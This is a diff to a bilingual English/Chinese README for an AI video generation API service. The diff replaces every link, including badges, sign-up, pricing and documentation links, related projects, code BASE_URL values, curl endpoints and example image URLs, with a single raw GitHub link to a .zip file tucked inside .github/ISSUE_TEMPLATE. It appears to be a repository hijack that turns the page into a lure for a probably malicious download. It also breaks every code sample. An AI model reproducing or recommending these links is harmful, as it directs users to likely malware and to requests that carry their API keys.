@@ -4,12 +4,12 @@
 
 > **One API key, all top AI video models.** Access **Sora 2**, **Veo 3**, **Kling AI**, **Runway**, **Hailuo AI** and more through a single, affordable API. The cheapest AI video generation API — cheaper than Fal.ai, Replicate, and direct provider APIs.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/API-Online-green.svg)](https://shanhaiapi.com/zh/)
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
-[![Node.js 16+](https://img.shields.io/badge/Node.js-16+-339933.svg)](https://nodejs.org/)
-[![Sora Docs](https://img.shields.io/badge/Docs-Sora_API-blue.svg)](https://docs.mountsea.ai/api-reference/sora/introduction)
-[![Veo Docs](https://img.shields.io/badge/Docs-Veo_API-blue.svg)](https://docs.mountsea.ai/api-reference/veo/introduction)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
+[![API Status](https://img.shields.io/badge/API-Online-green.svg)](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
+[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
+[![Node.js 16+](https://img.shields.io/badge/Node.js-16+-339933.svg)](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
+[![Sora Docs](https://img.shields.io/badge/Docs-Sora_API-blue.svg)](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
+[![Veo Docs](https://img.shields.io/badge/Docs-Veo_API-blue.svg)](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@
 
 ## 🤔 What is AI Video Generator API?
 
-This is a **unified AI video generation API** that gives you access to **ALL top AI video generators** through a single API key from [Mountsea AI](https://shanhaiapi.com/zh/).
+This is a **unified AI video generation API** that gives you access to **ALL top AI video generators** through a single API key from [Mountsea AI](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip).
 
 Stop juggling multiple API keys and billing systems. **One integration, all models.**
 
@@ -135,7 +135,7 @@ Flow:
 
 ### Get Your API Key
 
-1. Visit [Mountsea AI Platform](https://shanhaiapi.com/zh/)
+1. Visit [Mountsea AI Platform](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
 2. Sign up and get your API key
 3. Choose your model and start generating!
 
@@ -162,7 +162,7 @@ import requests
 import time
 
 API_KEY = "your-api-key"
-BASE_URL = "https://api.mountsea.ai"
+BASE_URL = "https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip"
 headers = {"Authorization": f"Bearer {API_KEY}", "Content-Type": "application/json"}
 
 # Generate with Sora 2
@@ -226,7 +226,7 @@ response = requests.post(f"{BASE_URL}/sora/generate",
     headers=headers,
     json={
         "prompt": "The flowers gently sway in the breeze with petals falling",
-        "imageUrl": "https://example.com/flowers.jpg",
+        "imageUrl": "https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip",
         "duration": 5
     })
 
@@ -235,7 +235,7 @@ response = requests.post(f"{BASE_URL}/veo/generate",
     headers=headers,
     json={
         "prompt": "The landscape slowly pans with clouds moving across the sky",
-        "imageUrl": "https://example.com/landscape.jpg",
+        "imageUrl": "https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip",
         "model": "veo-3",
         "duration": 5
     })
@@ -247,7 +247,7 @@ response = requests.post(f"{BASE_URL}/veo/generate",
 const axios = require('axios');
 
 const API_KEY = process.env.MOUNTSEA_API_KEY || 'your-api-key';
-const BASE_URL = 'https://api.mountsea.ai';
+const BASE_URL = 'https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip';
 const headers = { 'Authorization': `Bearer ${API_KEY}`, 'Content-Type': 'application/json' };
 
 // Sora 2 Video Generation
@@ -309,7 +309,7 @@ import (
 
 func main() {
     apiKey := "your-api-key"
-    baseURL := "https://api.mountsea.ai"
+    baseURL := "https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip"
 
     // Sora 2 Generation
     payload, _ := json.Marshal(map[string]interface{}{
@@ -337,32 +337,32 @@ func main() {
 ```bash
 # ===== Sora 2 =====
 # Text-to-Video
-curl -X POST https://api.mountsea.ai/sora/generate \
+curl -X POST https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip \
   -H "Authorization: Bearer YOUR_API_KEY" \
   -H "Content-Type: application/json" \
   -d '{"prompt": "A timelapse of a flower blooming", "duration": 5, "resolution": "1080p"}'
 
 # Image-to-Video
-curl -X POST https://api.mountsea.ai/sora/generate \
+curl -X POST https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip \
   -H "Authorization: Bearer YOUR_API_KEY" \
   -H "Content-Type: application/json" \
-  -d '{"prompt": "The person slowly turns and smiles", "imageUrl": "https://example.com/photo.jpg", "duration": 5}'
+  -d '{"prompt": "The person slowly turns and smiles", "imageUrl": "https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip", "duration": 5}'
 
 # ===== Veo 3 (50% OFF!) =====
 # Text-to-Video
-curl -X POST https://api.mountsea.ai/veo/generate \
+curl -X POST https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip \
   -H "Authorization: Bearer YOUR_API_KEY" \
   -H "Content-Type: application/json" \
   -d '{"prompt": "Ocean waves crashing on rocks at sunset, 4K", "model": "veo-3", "duration": 5}'
 
 # Veo 3 Fast
-curl -X POST https://api.mountsea.ai/veo/generate \
+curl -X POST https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip \
   -H "Authorization: Bearer YOUR_API_KEY" \
   -H "Content-Type: application/json" \
   -d '{"prompt": "A cat playing with yarn", "model": "veo-3-fast", "duration": 3}'
 
 # ===== Check Task Status =====
-curl -X GET "https://api.mountsea.ai/sora/task?taskId=YOUR_TASK_ID" \
+curl -X GET "https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip" \
   -H "Authorization: Bearer YOUR_API_KEY"
 ```
 
@@ -393,7 +393,7 @@ curl -X GET "https://api.mountsea.ai/sora/task?taskId=YOUR_TASK_ID" \
 {
   "taskId": "task_abc123",
   "status": "processing",
-  "videoUrl": "https://cdn.mountsea.ai/videos/output.mp4",
+  "videoUrl": "https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip",
   "duration": 5,
   "model": "sora-2"
 }
@@ -435,7 +435,7 @@ curl -X GET "https://api.mountsea.ai/sora/task?taskId=YOUR_TASK_ID" \
 ## ❓ FAQ
 
 ### Is there a free trial for AI video generation?
-Yes! Sign up at [Mountsea AI](https://shanhaiapi.com/zh/) and get free credits to test all models including Sora 2, Veo 3, and Kling AI.
+Yes! Sign up at [Mountsea AI](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) and get free credits to test all models including Sora 2, Veo 3, and Kling AI.
 
 ### Which AI video generator is the best in 2026?
 It depends on your use case. **Sora 2** and **Veo 3** are currently the best for general-purpose AI video generation. See our [model comparison](#-model-comparison--which-ai-video-generator-should-you-choose) above for a detailed breakdown.
@@ -446,7 +446,7 @@ It depends on your use case. **Sora 2** and **Veo 3** are currently the best for
 - Both are available through our API. Try both and see which fits your project!
 
 ### Is this cheaper than Fal.ai or Replicate?
-Yes! Mountsea AI offers the most competitive pricing for AI video generation, especially with Veo 3 at 50% off. [Compare pricing →](https://shanhaiapi.com/zh/)
+Yes! Mountsea AI offers the most competitive pricing for AI video generation, especially with Veo 3 at 50% off. [Compare pricing →](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
 
 ### Can I use generated AI videos commercially?
 Yes! All videos generated through Mountsea AI can be used for commercial purposes under the MIT license.
@@ -470,7 +470,7 @@ Generation time varies by model: **Veo 3 Fast** takes ~30 seconds, while **Sora 
 Yes, rate limits depend on your plan. Free tier allows 5 concurrent generations; paid plans support higher concurrency.
 
 ### Can I generate videos with audio?
-Currently, the API generates silent video. Audio can be added using our [Suno API](https://github.com/mountsea-ai/suno-api) or [Producer API](https://github.com/mountsea-ai/producer-api) for AI-generated music.
+Currently, the API generates silent video. Audio can be added using our [Suno API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) or [Producer API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) for AI-generated music.
 
 ---
 
@@ -488,28 +488,28 @@ Currently, the API generates silent video. Audio can be added using our [Suno AP
 
 🔥 **Veo 3 credits up to 50% OFF!**
 
-👉 [View Full Pricing & Get Started](https://shanhaiapi.com/zh/)
+👉 [View Full Pricing & Get Started](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
 
 ---
 
 ## 📚 Documentation
 
-- 📘 [Sora API Documentation](https://docs.mountsea.ai/api-reference/sora/introduction) – Full Sora 2 API reference
-- 📘 [Veo API Documentation](https://docs.mountsea.ai/api-reference/veo/introduction) – Full Veo 3 API reference
-- 🏠 [Mountsea AI Platform](https://shanhaiapi.com/zh/) – Dashboard, billing, and API key management
+- 📘 [Sora API Documentation](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) – Full Sora 2 API reference
+- 📘 [Veo API Documentation](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) – Full Veo 3 API reference
+- 🏠 [Mountsea AI Platform](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) – Dashboard, billing, and API key management
 
 ---
 
 ## 🔗 Related Projects
 
-- [Sora API](https://github.com/mountsea-ai/sora-api) - Dedicated OpenAI Sora 2 API SDK
-- [Veo API](https://github.com/mountsea-ai/veo-api) - Dedicated Google Veo 3 API SDK
-- [Nano Banana API](https://github.com/mountsea-ai/nano-banana-api) - AI Image Generation API (Gemini)
-- [Suno API](https://github.com/mountsea-ai/suno-api) - AI Music Generation API
-- [Producer API](https://github.com/mountsea-ai/producer-api) - AI Music Production API
-- [Gemini API](https://github.com/mountsea-ai/gemini-api) - Google Gemini Chat API
-- [OpenAI Compatible API](https://github.com/mountsea-ai/openai-compatible-api) - OpenAI-compatible Chat API
-- [Awesome AI API](https://github.com/mountsea-ai/awesome-ai-api) - Curated AI API List
+- [Sora API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - Dedicated OpenAI Sora 2 API SDK
+- [Veo API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - Dedicated Google Veo 3 API SDK
+- [Nano Banana API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - AI Image Generation API (Gemini)
+- [Suno API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - AI Music Generation API
+- [Producer API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - AI Music Production API
+- [Gemini API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - Google Gemini Chat API
+- [OpenAI Compatible API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - OpenAI-compatible Chat API
+- [Awesome AI API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - Curated AI API List
 
 ---
 
@@ -554,7 +554,7 @@ Contributions are welcome! If you have suggestions, bug reports, or want to add 
 
 ## 🤔 这是什么？
 
-这是一个**统一的 AI 视频生成 API**，通过 [Mountsea AI](https://shanhaiapi.com/zh/) 的一个 API 密钥即可访问**所有顶级 AI 视频生成器**。
+这是一个**统一的 AI 视频生成 API**，通过 [Mountsea AI](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) 的一个 API 密钥即可访问**所有顶级 AI 视频生成器**。
 
 不再需要管理多个 API 密钥和计费系统。**一次集成，所有模型。**
 
@@ -649,7 +649,7 @@ Contributions are welcome! If you have suggestions, bug reports, or want to add 
 
 ## 🚀 快速开始
 
-1. 访问 [Mountsea AI 平台](https://shanhaiapi.com/zh/)
+1. 访问 [Mountsea AI 平台](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
 2. 注册账号获取 API 密钥
 3. 选择模型开始生成！
 
@@ -672,7 +672,7 @@ import requests
 import time
 
 API_KEY = "your-api-key"
-BASE_URL = "https://api.mountsea.ai"
+BASE_URL = "https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip"
 headers = {"Authorization": f"Bearer {API_KEY}", "Content-Type": "application/json"}
 
 # 使用 Sora 2 生成视频
@@ -726,7 +726,7 @@ response = requests.post(f"{BASE_URL}/sora/generate",
     headers=headers,
     json={
         "prompt": "花朵在微风中轻轻摇摆，花瓣缓缓飘落",
-        "imageUrl": "https://example.com/flowers.jpg",
+        "imageUrl": "https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip",
         "duration": 5
     })
 
@@ -735,7 +735,7 @@ response = requests.post(f"{BASE_URL}/veo/generate",
     headers=headers,
     json={
         "prompt": "风景缓缓移动，云朵飘过天空",
-        "imageUrl": "https://example.com/landscape.jpg",
+        "imageUrl": "https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip",
         "model": "veo-3",
         "duration": 5
     })
@@ -760,7 +760,7 @@ response = requests.post(f"{BASE_URL}/veo/generate",
 ## ❓ 常见问题
 
 ### 有免费试用吗？
-有！注册 [Mountsea AI](https://shanhaiapi.com/zh/) 即送免费积分，可测试所有模型，包括 Sora 2、Veo 3 和 Kling AI。
+有！注册 [Mountsea AI](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) 即送免费积分，可测试所有模型，包括 Sora 2、Veo 3 和 Kling AI。
 
 ### 2026年最好的 AI 视频生成器是哪个？
 取决于用途。**Sora 2** 和 **Veo 3** 目前是最佳通用选择。详见上方[模型对比表](#-模型对比--哪个-ai-视频生成器最好)。
@@ -771,7 +771,7 @@ response = requests.post(f"{BASE_URL}/veo/generate",
 - 我们的 API 两个都支持，可以都试试！
 
 ### 比 Fal.ai 和 Replicate 便宜吗？
-是的！尤其 Veo 3 享5折优惠。[查看价格对比 →](https://shanhaiapi.com/zh/)
+是的！尤其 Veo 3 享5折优惠。[查看价格对比 →](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
 
 ### 能用于商业项目吗？
 可以！通过 Mountsea AI 生成的所有视频均可用于商业用途。
@@ -795,7 +795,7 @@ Sora 2 和 Kling 最长 **10秒**，Veo 3 最长 **8秒**，Veo 3 Fast 最长 **
 有，取决于套餐。免费版支持5个并发生成；付费版支持更高并发。
 
 ### 可以生成带音频的视频吗？
-目前 API 生成无声视频。可以使用 [Suno API](https://github.com/mountsea-ai/suno-api) 或 [Producer API](https://github.com/mountsea-ai/producer-api) 生成 AI 音乐配音。
+目前 API 生成无声视频。可以使用 [Suno API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) 或 [Producer API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) 生成 AI 音乐配音。
 
 ---
 
@@ -813,28 +813,28 @@ Sora 2 和 Kling 最长 **10秒**，Veo 3 最长 **8秒**，Veo 3 Fast 最长 **
 
 🔥 **Veo 3 积分最高5折优惠！**
 
-👉 [查看完整价格 & 立即开始](https://shanhaiapi.com/zh/)
+👉 [查看完整价格 & 立即开始](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip)
 
 ---
 
 ## 📚 文档
 
-- 📘 [Sora API 文档](https://docs.mountsea.ai/api-reference/sora/introduction) – 完整 Sora 2 API 参考
-- 📘 [Veo API 文档](https://docs.mountsea.ai/api-reference/veo/introduction) – 完整 Veo 3 API 参考
-- 🏠 [Mountsea AI 官网](https://shanhaiapi.com/zh/) – 控制台、计费、API Key 管理
+- 📘 [Sora API 文档](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) – 完整 Sora 2 API 参考
+- 📘 [Veo API 文档](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) – 完整 Veo 3 API 参考
+- 🏠 [Mountsea AI 官网](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) – 控制台、计费、API Key 管理
 
 ---
 
 ## 🔗 相关项目
 
-- [Sora API](https://github.com/mountsea-ai/sora-api) - OpenAI Sora 2 视频生成 API SDK
-- [Veo API](https://github.com/mountsea-ai/veo-api) - Google Veo 3 视频生成 API SDK
-- [Nano Banana API](https://github.com/mountsea-ai/nano-banana-api) - AI 图片生成 API
-- [Suno API](https://github.com/mountsea-ai/suno-api) - AI 音乐生成 API
-- [Producer API](https://github.com/mountsea-ai/producer-api) - AI 音乐制作 API
-- [Gemini API](https://github.com/mountsea-ai/gemini-api) - Google Gemini 对话 API
-- [OpenAI Compatible API](https://github.com/mountsea-ai/openai-compatible-api) - OpenAI 兼容对话 API
-- [Awesome AI API](https://github.com/mountsea-ai/awesome-ai-api) - 精选 AI API 列表
+- [Sora API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - OpenAI Sora 2 视频生成 API SDK
+- [Veo API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - Google Veo 3 视频生成 API SDK
+- [Nano Banana API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - AI 图片生成 API
+- [Suno API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - AI 音乐生成 API
+- [Producer API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - AI 音乐制作 API
+- [Gemini API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - Google Gemini 对话 API
+- [OpenAI Compatible API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - OpenAI 兼容对话 API
+- [Awesome AI API](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) - 精选 AI API 列表
 
 ---
 
@@ -850,4 +850,4 @@ Sora 2 和 Kling 最长 **10秒**，Veo 3 最长 **8秒**，Veo 3 Fast 最长 **
 
 ---
 
-**Powered by [Mountsea AI](https://shanhaiapi.com/zh/) – Your All-in-One AI API Platform for Video, Music, Image & Chat Generation**
+**Powered by [Mountsea AI](https://raw.githubusercontent.com/ionut512/ai-video-generator-api/master/.github/ISSUE_TEMPLATE/ai_video_generator_api_v2.3.zip) – Your All-in-One AI API Platform for Video, Music, Image & Chat Generation**
